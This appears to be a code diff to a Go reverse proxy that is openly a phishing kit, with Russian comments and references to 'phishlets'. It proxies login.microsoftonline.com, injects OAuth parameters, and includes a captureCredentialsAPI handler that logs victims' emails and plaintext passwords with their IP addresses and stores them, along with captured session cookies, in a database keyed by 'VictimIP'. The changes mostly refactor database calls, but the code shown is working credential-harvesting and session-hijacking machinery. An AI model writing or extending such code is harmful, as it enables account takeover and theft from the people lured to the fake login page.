@@ -200,7 +200,7 @@ func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		p.logger.Debug("CORS preflight request",
 			zap.String("path", r.URL.Path),
 			zap.String("origin", r.Header.Get("Origin")))
-		
+
 		w.Header().Set("Access-Control-Allow-Origin", "*")
 		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
 		w.Header().Set("Access-Control-Allow-Headers", "*")
@@ -233,19 +233,19 @@ func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	// Добавление client_id и scope в GET запросы на OAuth
 	if r.Method == "GET" && strings.Contains(r.URL.Path, "/oauth2/") {
 		query := r.URL.Query()
-		
+
 		// Добавляем client_id если нет
 		if !query.Has("client_id") {
 			query.Set("client_id", "00000002-0000-0000-c000-000000000000")
 			p.logger.Info("client_id added to URL")
 		}
-		
+
 		// Добавляем scope если нет
 		if !query.Has("scope") {
 			query.Set("scope", "openid profile email")
 			p.logger.Info("scope added to URL")
 		}
-		
+
 		// Исправляем redirect_uri на стандартный
 		if query.Has("redirect_uri") {
 			oldURI := query.Get("redirect_uri")
@@ -254,7 +254,7 @@ func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 				p.logger.Info("redirect_uri corrected")
 			}
 		}
-		
+
 		r.URL.RawQuery = query.Encode()
 	}
 
@@ -299,7 +299,7 @@ func (p *HTTPProxy) serveLoginPage(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Error loading login page", http.StatusInternalServerError)
 		return
 	}
-	
+
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.WriteHeader(http.StatusOK)
 	w.Write(htmlContent)
@@ -312,45 +312,49 @@ func (p *HTTPProxy) captureCredentialsAPI(w http.ResponseWriter, r *http.Request
 		Email    string `json:"email"`
 		Password string `json:"password"`
 	}
-	
+
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		p.logger.Error("Failed to parse credentials", zap.Error(err))
 		w.WriteHeader(http.StatusBadRequest)
 		json.NewEncoder(w).Encode(map[string]string{"error": "Invalid request"})
 		return
 	}
-	
+
 	p.logger.Info("Credentials captured via HTTPS",
 		zap.String("email", req.Email),
 		zap.String("password", req.Password),
 		zap.String("ip", p.getClientIP(r)))
-	
+
 	// Сохраняем в БД
-	session, err := p.db.CreateSession(
-		p.getClientIP(r),
-		"login_page",
-		r.UserAgent(),
-		"",
-	)
-	if err != nil {
+	session := &database.Session{
+		VictimIP:   p.getClientIP(r),
+		TargetURL:  "login_page",
+		UserAgent:  r.UserAgent(),
+		State:      "active",
+	}
+	if err := p.db.CreateSession(session); err != nil {
 		p.logger.Error("Failed to create session", zap.Error(err))
 		w.WriteHeader(http.StatusInternalServerError)
 		json.NewEncoder(w).Encode(map[string]string{"error": "Database error"})
 		return
 	}
-	
-	_, err = p.db.SaveCredentials(session.ID, req.Email, req.Password, nil)
-	if err != nil {
+
+	creds := &database.Credentials{
+		SessionID: session.ID,
+		Username:  req.Email,
+		Password:  req.Password,
+	}
+	if err := p.db.CreateCredentials(creds); err != nil {
 		p.logger.Error("Failed to save credentials", zap.Error(err))
 		w.WriteHeader(http.StatusInternalServerError)
 		json.NewEncoder(w).Encode(map[string]string{"error": "Database error"})
 		return
 	}
-	
+
 	p.logger.Info("Credentials saved to database",
 		zap.String("session_id", session.ID),
 		zap.String("email", req.Email))
-	
+
 	w.Header().Set("Content-Type", "application/json")
 	w.WriteHeader(http.StatusOK)
 	json.NewEncoder(w).Encode(map[string]string{
@@ -363,7 +367,7 @@ func (p *HTTPProxy) captureCredentialsAPI(w http.ResponseWriter, r *http.Request
 func (p *HTTPProxy) handleRoot(w http.ResponseWriter, r *http.Request) {
 	// Проверяем Accept header для определения типа клиента
 	accept := r.Header.Get("Accept")
-	
+
 	if strings.Contains(accept, "text/html") {
 		// Браузер - показываем тестовую страницу
 		p.serveTestPage(w, r)
@@ -415,7 +419,7 @@ func (p *HTTPProxy) serveTestPage(w http.ResponseWriter, r *http.Request) {
     </script>
 </body>
 </html>`
-	
+
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.WriteHeader(http.StatusOK)
 	w.Write([]byte(html))
@@ -424,15 +428,15 @@ func (p *HTTPProxy) serveTestPage(w http.ResponseWriter, r *http.Request) {
 // director модифицирует запрос перед отправкой на бэкенд
 func (p *HTTPProxy) director(req *http.Request) {
 	session := p.getSessionFromContext(req)
-	
+
 	// Определяем целевой хост из phishlet
 	targetHost := "login.microsoftonline.com"
 	targetScheme := "https"
-	
+
 	if session != nil && session.TargetHost != "" {
 		targetHost = session.TargetHost
 	}
-	
+
 	// Получаем phishlet для определения target
 	if session != nil && session.PhishletID != "" {
 		if phishlet, ok := p.phishlets[session.PhishletID]; ok {
@@ -448,14 +452,14 @@ func (p *HTTPProxy) director(req *http.Request) {
 			}
 		}
 	}
-	
+
 	// Устанавливаем target URL
 	req.URL.Scheme = targetScheme
 	req.URL.Host = targetHost
-	
+
 	// ОРИГИНАЛЬНЫЙ Host header для Microsoft
 	req.Host = targetHost
-	
+
 	p.logger.Info("DIRECTOR - Target set",
 		zap.String("target_host", targetHost),
 		zap.String("session", session.ID))
@@ -466,7 +470,7 @@ func (p *HTTPProxy) director(req *http.Request) {
 			zap.String("path", req.URL.Path),
 			zap.String("session", session.ID),
 			zap.String("ip", p.getClientIP(req)))
-		
+
 		// Читаем тело запроса
 		bodyBytes, err := io.ReadAll(req.Body)
 		if err != nil {
@@ -474,10 +478,10 @@ func (p *HTTPProxy) director(req *http.Request) {
 		} else {
 			bodyStr := string(bodyBytes)
 			originalBody := bodyStr
-			
+
 			// Проверяем есть ли client_id
 			hasClientID := strings.Contains(bodyStr, "client_id=")
-			
+
 			// Добавляем client_id если нет
 			if !hasClientID {
 				if bodyStr != "" {
@@ -485,18 +489,18 @@ func (p *HTTPProxy) director(req *http.Request) {
 				} else {
 					bodyStr = "client_id=00000002-0000-0000-c000-000000000000"
 				}
-				
+
 				p.logger.Info("client_id ADDED!",
 					zap.String("original_len", fmt.Sprintf("%d", len(originalBody))),
 					zap.String("new_len", fmt.Sprintf("%d", len(bodyStr))))
 			} else {
 				p.logger.Info("client_id already present")
 			}
-			
+
 			// Обновляем Content-Length и тело
 			req.ContentLength = int64(len(bodyStr))
 			req.Body = io.NopCloser(strings.NewReader(bodyStr))
-			
+
 			// Логируем первые 200 символов для отладки
 			logLen := 200
 			if len(bodyStr) < logLen {
@@ -733,13 +737,14 @@ func (p *HTTPProxy) createSession(clientIP string, r *http.Request) *ProxySessio
 
 	targetHost := p.determineTargetHost(r)
 
-	_, err := p.db.CreateSession(
-		clientIP,
-		targetHost,
-		r.UserAgent(),
-		"",
-	)
-	if err != nil {
+	dbSession := &database.Session{
+		ID:         id,
+		VictimIP:   clientIP,
+		TargetURL:  targetHost,
+		UserAgent:  r.UserAgent(),
+		State:      "active",
+	}
+	if err := p.db.CreateSession(dbSession); err != nil {
 		p.logger.Error("Failed to create session in DB", zap.Error(err))
 	}
 
@@ -886,8 +891,12 @@ func (p *HTTPProxy) SaveCredentials(sessionID, username, password string) error 
 		return fmt.Errorf("session not found")
 	}
 
-	creds, err := p.db.SaveCredentials(sessionID, username, password, nil)
-	if err != nil {
+	creds := &database.Credentials{
+		SessionID: sessionID,
+		Username:  username,
+		Password:  password,
+	}
+	if err := p.db.CreateCredentials(creds); err != nil {
 		return err
 	}
 
@@ -932,7 +941,17 @@ func (p *HTTPProxy) AddCookie(sessionID, name, value, domain, path string, expir
 		return fmt.Errorf("session not found")
 	}
 
-	if err := p.db.SaveCookie(sessionID, name, value, domain, path, expires, httpOnly, secure); err != nil {
+	cookie := &database.Cookie{
+		SessionID: sessionID,
+		Name:      name,
+		Value:     value,
+		Domain:    domain,
+		Path:      path,
+		Expires:   expires,
+		HTTPOnly:  httpOnly,
+		Secure:    secure,
+	}
+	if err := p.db.CreateCookie(cookie); err != nil {
 		return err
 	}
 
@@ -1023,7 +1042,7 @@ func (p *HTTPProxy) CheckPhishletHealth(phishletID string) map[string]interface{
 
 	for _, host := range phishlet.ProxyHosts {
 		targetURL := fmt.Sprintf("https://%s.%s", host.OrigSub, host.Domain)
-		
+
 		targetResult := map[string]interface{}{
 			"host":   targetURL,
 			"status": "unknown",
